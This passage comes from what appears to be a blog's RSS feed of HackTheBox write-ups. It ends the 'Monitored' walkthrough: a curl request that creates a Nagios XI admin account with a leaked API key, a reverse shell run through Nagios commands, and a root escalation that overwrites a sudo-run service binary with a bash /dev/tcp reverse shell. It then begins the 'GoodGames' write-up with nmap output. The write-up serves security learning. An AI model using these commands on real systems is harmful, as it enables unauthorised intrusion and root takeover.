        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pretty&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vars_post&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rand_text_alpha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#{username}@localhost&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;auth_level&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;force_pw_change&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that it tries to create/add an admin account, and it passes a parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_level=admin&lt;/code&gt;. Let’s combine cURL with this information and try to create this admin account:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;amp;pretty=1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=mula&amp;amp;password=mula&amp;amp;name=mula&amp;amp;email=mula@localhost&amp;amp;auth_level=admin&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;User account mula was added successfully!&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;: 6
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we try to login within the browser:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored8.png&quot; alt=&quot;login successful&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok! Now we are inside Nagios XI and logged in as administrator:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored9.png&quot; alt=&quot;admin panel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After poking around the application and looking for its documentation, I stumbled upon &lt;a href=&quot;https://documentation.sysaid.com/docs/configure-nagios-xi-integration&quot;&gt;this&lt;/a&gt; topic that explains how one can add and execute commands within Nagios XI. We need to configure a new command at Configure &amp;gt; Core Config Manager &amp;gt; Commands &amp;gt; Add New and we are able to pass any command we like. Alright, let’s pass it a reverse shell then!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored10.png&quot; alt=&quot;admin panel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To run the command, we go to Services (left panel) &amp;gt; Add New and inside the Check command dropdown input, we select rev_shell. Then we click on Run Check Command. Don’t forget to leave your netcat listening before hitting this button!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4242
Connection from 10.129.37.52:54666
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14645&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;nagios
nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls       
ls
&lt;/span&gt;cookie.txt
user.txt
nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Granting us the user shell.&lt;/p&gt;

&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;

&lt;p&gt;My first enumeration command was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and the output impressed me:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nagios on localhost:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User nagios may run the following commands on localhost:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios start
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios stop
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios restart
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios reload
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios status
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios checkconfig
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd start
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd stop
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd restart
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd reload
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd status
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So many different possibilities here! After looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sh&lt;/code&gt; files, I’ve found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manage_services.sh&lt;/code&gt; was used to start, stop and check status of npcd. Here’s the output of npcd status:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/nagiosxi/scripts/manage_services.sh status npcd
&amp;lt;cal/nagiosxi/scripts/manage_services.sh status npcd
● npcd.service - Nagios Process Control Daemon
     Loaded: loaded &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/etc/systemd/system/npcd.service&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; enabled&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; vendor preset: enabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     Active: active &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;running&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; since Tue 2024-01-16 17:29:58 EST&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 4h 1min ago
   Main PID: 727 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;npcd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
      Tasks: 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;limit: 4661&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     Memory: 276.0K
        CPU: 228ms
     CGroup: /system.slice/npcd.service
             └─727 /usr/local/nagios/bin/npcd &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/local/nagios/etc/pnp/npcd.cfg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;npcd.service&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/nagios/bin/npcd&lt;/code&gt; when running, and we also have write privileges on this directory and in the file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/nagios/bin
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/nagios/bin
total 2192
drwxr-xr-x 2 nagios nagios    4096 Nov  9 10:43 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios  717648 Nov  9 10:40 nagios
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios   43648 Nov  9 10:40 nagiostats
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios 1043688 Nov  9 10:42 ndo.so
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root      1083 Nov  9 10:42 ndo-startup-hash.sh
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr--&lt;/span&gt; 1 nagios nagios   31584 Nov  9 10:42 npcd
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr--&lt;/span&gt; 1 nagios nagios   14552 Nov  9 10:42 npcdmod.o
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root    215488 Nov  9 10:43 nrpe
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root     10661 Nov  9 10:43 nrpe-uninstall
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root    142920 Nov  9 10:43 nsca
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This means that we could erase the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;npcd&lt;/code&gt; binary and replace it with a reverse shell. If this succeeds, we might get root.&lt;/p&gt;

&lt;h2 id=&quot;-step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Step 4 - Privilege escalation&lt;/h2&gt;

&lt;p&gt;Let’s try it out! First, we need to stop the service in order to be able to alter the file’s content:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
&amp;lt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;/nagiosxi/scripts/manage_services.sh stop npcd
nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.200/9000 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; npcd
&amp;lt;ash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.10.10/9000 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;&quot; &amp;gt;&amp;gt; npcd
nagios@monitored:/usr/local/nagios/bin$ cat npcd
cat npcd
#!/bin/bash
bash -c &apos;&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.10.10/9000 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We successfully overwritten the npcd binary. Now, we start another netcat on port 9000 and start the service back again with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd&lt;/code&gt; to get the root shell:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored11.png&quot; alt=&quot;root-shell&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;This was a nice ride. Lots of rabbit holes along the way, but lots of new things learned. We were able to find our way in the website by first using snmpwalk which leaked some unprivileged user credentials. With these, we were able to create authentication tokens at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api/v1/authenticate&lt;/code&gt; endpoint, which were then used to test a SQL injection at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; endpoint. With SQLMap, we were able to retrieve the administrator API key, which was used to create a new admin account under Nagios XI. Then, this newly created admin account provided us the opportunity to run a reverse shell within Nagios XI commands, granting us the user shell.&lt;/p&gt;

&lt;p&gt;From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had write permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.&lt;/p&gt;

&lt;p&gt;Simply amazing!&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 16 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//monitored-htb</link>
        <link href="http://localhost:4000/monitored-htb"/>
        <guid isPermaLink="true">http://localhost:4000/monitored-htb</guid>
      </item>
    
      <item>
        <title>GoodGames - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let’s solve another &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; CTF. In this box, we are going to see SQL injection, Server-Side Template Injection (SSTI) and Docker breakout.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;About GoodGames&lt;/p&gt;

  &lt;p&gt;GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;render_template_string&lt;/code&gt; in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Very descriptive, huh? The description already tells us what path should we take
in order to solve the challenge.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;Crafting the attack&lt;/li&gt;
  &lt;li&gt;Getting root&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Each concept, including SQL injection, SSTI, and Docker escape, will be explained as needed throughout the four steps.&lt;/p&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;Alright. As a basic procedure to solve any box or CTF-like machine, we will start enumerating the system’s ports. To do so,
we will be using Nmap:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap 10.129.96.71
&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sun Jan  7 23:08:10 2024 as: nmap -p- -T4 --min-rate 1000 -A -oN ports.nmap 10.129.96.71&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.96.71
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65534 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
TCP/IP fingerprint:
OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/7%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40632%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;659B2F51
